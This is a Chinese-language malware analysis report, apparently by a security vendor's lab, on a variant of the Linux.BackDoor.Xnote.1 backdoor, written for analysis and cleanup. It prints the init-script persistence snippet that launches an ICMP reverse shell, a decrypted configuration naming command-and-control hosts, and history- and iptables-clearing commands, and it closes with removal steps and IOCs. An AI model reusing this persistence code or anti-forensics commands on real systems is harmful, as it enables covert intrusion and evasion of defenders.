***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

##  **一、事件背景**

**根据某客户现场反应，部署在网络环境中的深信服安全感知系统报警，某Linux服务器经常出现apache的conf文件被篡改后出现挂黑链的情况，并且偶尔出现大规模的DDOS外发现象恶意进程删除后会自动重启，无法彻底删除。**

深信服EDR安全团队快速定位，捕获到了相应的病毒样本，通过分析确认此样本是Linux.BackDoor.Xnote.1恶意样本的最新变种，感染方式与之前类似。

此样本在VT([www.virustotal.com](http://www.virustotal.com))上的截图信息，如下所示：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279075904222.png!small)

目前只有少数几家安全厂商能识别出此恶意样本。

## **二、样本流程图**

病毒主体进程守护，如图：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076862457.png!small)

说明：病毒先将自身启动代码写入系统启动读取的配置文件中，系统每一次启动都会先读取配置文件后加载病毒文件dump_tcp，再由它来释放出另一个病毒文件到tmp目录下。病毒文件dump_tcp在系统中会创建三个相同的进程[ksoftirqd/7]，并互为守护进程。

病毒母体运行流程,如图：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076933533.png!small)

##  **三、样本简介**

Linux.BackDoor.Xnote.1最早是由国外安全公司Dr.Web发现，该木马功能完善，主要通过爆力破解服务器SSH，感染服务器主机，然后利用服务器主机对相应的IP地址发起DDOS攻击。

Linux.BackDoor.Xnote.1是一款多功能木马后门程序，目的是在受感染设备中执行入侵者发出的各种命令，例如进行DDoS攻击、组建僵尸网络等各种各样的恶意行为。后门进程运行过程中会收集系统的相关信息，并将这些信息发送到C&C（命令控制）服务器后等待下一步指示。入侵者则可以通过远程命令对主机下发对指定目标发动SYN
Flood、UDP Flood、CC攻击和NTP
放大攻击等任务，或者通过后门程序实现对感染设备的完全控制，在感染设备中进行上传/下载入侵者指定的文件，对感染设备的文件系统进行管理等行为（包括窃取并发送用户数据，创建、删除以及运行文件等，危险等级极高）。

初步推断这是国内黑客生成的Linux后门集群木马（Dr.Web则认为，来自中国的ChinaZ黑客组织是幕后黑手），用于控制被感染主机，获取被感染主机资料信息，组建僵尸网络发动DDoS攻击。

##  **四、样本分析跟踪过程**

通过线程检查发现，系统存在二个对外发起连接的进程

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076073988.png!small)

外联地址均为HK的IP地址，黑客朋友都懂得，毕竟方便且价格便宜。

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076112154.png!small)

根据对二个对外发起连接的恶意进程进行追溯，发现其中一个进程的父进程PID信息，通过检查发现伪装的电源进程kthreadd且三个相为守护进程。同时删除三个进程之后一段时间后依然会重新运行。

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076179531.png!small)

对伪装threadd进程进行进一步分析，发现其中的存在可疑的模块。

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076219811.png!small)

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076268796.png!small)

通过对源码与内存中的信息进行分析，发现病毒程序启动时会释放相关文件到/var/tmp/目录下，运行完之后自动删除。

备份的病毒母体dump_tcp文件到/usr/sbin/目录之下,释放另外一个通信进程cupsd到/user/local目录下。

同时生成一个名为nfsiod的反弹shell，反编译之后如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076555496.png!small)

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/1527907659287.png!small)

连接的域名为: zzz.457467.com 威胁情报暂未收录此域名。

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076669242.png!small)

病毒通过遍历/etc/init.d/ 与
/etc/rc.d/init.d/中的文件，查找字符串"!#/bin/sh"开头的文件并在文件结尾添加自启动代码，保证了即使三个进程被同时删除后在一定的时间内也可以重新启动。

感染etc/init.d/functions,在最后添加代码运行在/usr/lib/目录下的nfsiod此hell为

    
    
    PRISM-ICMP-Reverse-Shell类，详细介绍可百度一下。
    
    PIDS=`ps -ef |grep '\[nfsiod\]' |grep -v grep | awk '{print $2}'`
    
    if [ "$PIDS" != "" ]; then
    
    kill -9 $PIDS
    
    /usr/lib/nfsiod 1>/dev/null 2>/dev/null
    
            else
    
    /usr/lib/nfsiod 1>/dev/null 2>/dev/null
    
    fi

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076741874.png!small)

发现大部分启动项文件都已经被篡改，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279076779151.png!small)

##  **五、样本主体分析**

(1)样本通过Linux upx变形壳进行加密，无法使用upx工具直接脱壳，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077058695.png!small)

动态调试，手工脱壳，找到母体代码入口，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077211890.png!small)

然后dump出样本的母体文件，通过ida进行分析。

(2)通过sys_stat64函数判断是否存在/tmp文件目录，如果存在则安装恶意程序，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077274643.png!small)

(3)读取进程，获取文件的绝对路径，open(/proc/self/exe)如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077336689.png!small)

(4)解密出恶意文件配置相关信息，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077431041.png!small)

解密出来的信息如下：

    
    
    [main]
    
    auto_start = 1
    
    close_iptable = 0
    
    cmd0 = "fuser -k /tmp/.wq4sMLArXw"
    
    fake_ps = [kthreadd]
    
    group = xin
    
    host0 = 112.175.69.81:80
    
    host1 = yy.goodyouxi.com:80
    
    host2 = 123.1.152.18:443
    
    host3 = bak.goodyouxi.com:445
    
    install_path = /usr/sbin/dump_tcp
    
    install_path_bak = /usr/local/share/man/man1/mail.conf
    
    is_worker = 0
    
    killprocess0 = /bin/iptable6
    
    killprocess1 = rkthunter
    
    lock_fd = -1
    
    lock_file = /bin/sh
    
    mon_interval = 10
    
    note = xdkb
    
    plugin_dir = /usr/lib/plgs/
    
    retry_interval = 5
    
    tmp_start_dir = /var/tmp

从上面的配置文件，我们可以基本上看出这款恶意程序的感染方式，远程服务器地址列表等。

(5)后面就是进行一系列的安装，驻留等过程，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077629158.png!small)

(6)清除入侵的日志信息，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077652826.png!small)

能过设置HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077716987.png!small)

(7)清除入侵主机的iptables规则，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077747409.png!small)

通过调用iptable -F进行清除，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/1527907777189.png!small)

(8)遍历etc/init.d与/etc/rc.d/init.d中的文件，然后查找相应的字符串”!#/bin/sh”开头的文件并在文件结尾添加自启动代码，如下：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077817140.png!small)

感染完成之后，如下图所示：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/15279077842469.png!small)

(9)收集主机相关的信息，如下:

![图片.png](https://image.3001.net/images/20180602/15279077886134.png!small)

收集的主要信息，如下：

/proc/meminfo /proc/cpuinfo /etc/hostname /proc/net/udp等

(10)恶意程序感染安装完成之后，会通过远程命令执行不同的操作，如下：

![图片.png](https://image.3001.net/images/20180602/15279078165523.png!small)

(11)通过循环接受远程命令对指定目标可以开启不同类型的DDoS攻击(SYN DDoS、UDP DDoS、NTP DDoS，CC
DDoS），当收到DDoS攻击指令后会单独开一个新的线程进行攻击，以SYN DDoS攻击为例：

![Linux.BackDoor.Xnote.1最新变种来袭](https://image.3001.net/images/20180602/1527907822515.png!small)

![图片.png](https://image.3001.net/images/20180602/15279078252345.png!small)

(11)恶意样本运行完成之后，能过unlink进行自删除操作。

##  **六、清除病毒**

1.同时结束三个伪装的电源进程kthreadd与伪装cupsd进程

2.结束发包进程Vmtoolsd、sh（若存在）

3.删除/usr/lib/nfsiod 反弹shell连接

4.删除/var/tmp/下的所有病毒释放体文件

5.Vi /etc/init.d/functions文件删除最下面的如下片断

    
    
    PIDS=`ps -ef |grep '\[nfsiod\]' |grep -v grep | awk '{print $2}'`
    
    　　if [ "$PIDS" != "" ]; then
    
    　　kill -9 $PIDS
    
    　　/usr/lib/nfsiod 1>/dev/null 2>/dev/null
    
    　　        else
    
    　　/usr/lib/nfsiod 1>/dev/null 2>/dev/null
    
    　　Fi

6.删除病毒母体文件目录为：usr/sbin/dump_tcp 、/etc/security/ntps.conf

7.清理被篡的启动项文件，包括/etc/init.d/与/etc/rc.d/下的所有文件，删除文件前几行中的如下字段：

    
    
    　/usr/sbin/dump_tcp 2 > /dev/null
    
    /usr/security/ntps.conf 2 > /dev/null

##  **七、解决方案**

1.病毒在此次安全事件中是通过SSH弱口令爆破，由此提醒用户要注意定期修改系统中各类重要密码，并建议使用比较复杂的口令作为密码。

##  **八、IOC**

 **MD5**

    
    
    054CC420656E2BD296868F9F65DFF57B
    
    
    112.175.69.81:80
    
    yy.goodyouxi.com:80
    
    123.1.152.18:443
    
    bak.goodyouxi.com:445

 ***本文作者：千里目安全实验室，转载请注明来自 freeBuf.COM**

